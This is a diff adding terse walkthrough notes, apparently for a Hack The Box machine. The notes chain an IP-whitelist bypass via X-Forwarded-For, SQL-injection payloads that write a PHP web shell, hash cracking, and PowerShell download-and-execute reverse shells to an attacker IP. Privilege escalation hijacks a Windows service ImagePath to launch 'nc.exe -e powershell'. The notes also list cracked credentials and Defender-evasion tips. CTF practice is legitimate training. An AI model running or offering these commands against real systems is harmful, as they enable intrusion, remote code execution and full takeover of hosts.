@@ -1,0 +1,56 @@
+//Based on TRX and IppSec
+//admin page has a comment that certificates are stored on 192.168.4.28
+//it has withelisting, so we add the header:
+//google: forwarded headers
+X-Forwarded-For: 192.168.4.28
+
+//sqlmap 
+manager:l3tm3!n		//database user
+hashcat -m 300 hashes /usr/share/wordlists/rockyou.txt --force
+hector:0e178792e8fc304a2e3133d535d38caf1da3cd9d:l33th4x0rhector
+
+test'union select("whatever"),2,3,4,5,6 into outfile 'C:\\inetpub\\wwwroot\\whatever.txt'-- -
+test'union select("whatever"),2,3,4,5,6 into dumpfile 'C:\\inetpub\\wwwroot\\whatever.txt'-- -
+test'union select("<?php system($_REQUEST['cmd'])?>"),2,3,4,5,6 into outfile 'C:\\inetpub\\wwwroot\\cmd.php'-- -
+test'union select("<?php system($_REQUEST['cmd'])?>"),2,3,4,5,6 into dumpfile 'C:\\inetpub\\wwwroot\\cmd.php'-- -	//dumpfile has less bad characters, and can be helpful to bypass in some cases
+http://10.10.10.167/cmd.php?cmd=whoami
+cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 shell.ps1
+cmd=powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.36/shell.ps1')"	//in shell.ps1, deleted comments and changed function name because defender detects as malicious, so we can't get shell
+python3 -m http.server 80
+rlwrap nc -lvnp 9001	//nt authority\iusr shell
+ 
+//Lateral movement
+$password = convertto-securestring -AsPlainText -Force -String "l33th4x0rhector"
+$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "CONTROL\hector",$password
+Invoke-Command -ComputerName LOCALHOST -ScriptBlock { powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.36/shell.ps2')" } -Credential $credential	//hector's shell and user.txt
+
+PrivEsc
+gc c:\Users\hector\roaming\microsoft\windows\powershell\psreadline\ConsoleHost_history.txt	//powershell history
+get-childitem HKLM:\SYSTEM\CurrentControlset | format-list
+get-acl HKLM:\SYSTEM\CurrentControlSet | format-list
+$acl = get-acl HKLM:\SYSTEM\CurrentControlSet\Services
+ConvertFrom-SddlString -Sddl $acl.Sddl -type Registryrights | Foreach-Object {$_.DiscretionaryAcl}	//shows hector has full control on registry
+$services = Get-ItemProperty -Path HKLM:\System\CurrentControlSet\Services\*
+$tmp = $services | where { ($_.Objectname -match 'LocalSsytem') }
+$tmp | select PSChildName | measure	//count of services
+$tmp = $services | where { ($_.Objectname -match 'LocalSsytem') -and ($_.Start -match '3') }	//3 is manual, just to see manual start services
+
+cmd /c sc sdshow wuauserv
+convertFrom-SDDLString -Sddl "D:(A;;CCLCSWRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)"
+convertFrom-SDDLString -Sddl "D:(A;;CCLCSWRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)" | foreach-object {$_.DiscretionaryAcl}
+convertFrom-SDDLString -Sddl "D:(A;;RP;;;AU)"
+
+$names =tmp.pschildname
+$canStart = foreach($service in $names) { $sddl = (cmd /s sc sdshow $service); if ($sddl -match "RP[A-Z]*?;;;AU") { $service }}		//list of services that can be started 
+
+cd HKLM:\SYSTEM\Currentcontrolset\services
+gci	//dumps all services
+get-item wuauserv
+set-itemproperty -path wuauserv -Name ImagePath -Value "whatever"
+get-item wuauserv	//imagepath changed
+cd c:\windows\system32\spool\drivers\color
+//copy netcat, make suer has the -e command
+.\nc.exe 10.10.14.36 9004 -e powershell
+set-itemproperty -path wuauserv -Name ImagePath -Value "C:\windows\system32\spool\drivers\color\nc.exe 10.10.14.36 9004 -e powershell"
+start-service wuauserv
+gc c:\Users\administrator\desktop\root.txt
